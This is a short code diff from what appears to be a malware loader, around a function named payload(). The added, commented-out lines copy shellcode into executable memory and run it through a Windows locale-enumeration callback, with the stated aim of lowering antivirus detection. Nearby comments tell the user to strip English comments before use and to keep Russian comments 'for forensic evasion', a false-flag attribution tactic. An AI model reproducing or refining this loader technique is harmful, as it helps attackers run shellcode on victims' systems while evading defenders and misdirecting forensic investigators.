@@ -169,5 +169,11 @@ int payload () {
 // I may need to encapsulate this function call shart, and then the payload
 //please remove all English comments before use. 
 
+//Can I add this for an even lower detection rate?
+//LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+//memcpy(mem, shellcode, len);
+// Shellcode executes as a locale enumeration callback
+//EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, LCID_INSTALLED);
+
 //Это мой проект
 //Leave Russian Comments for Forensic Evasion
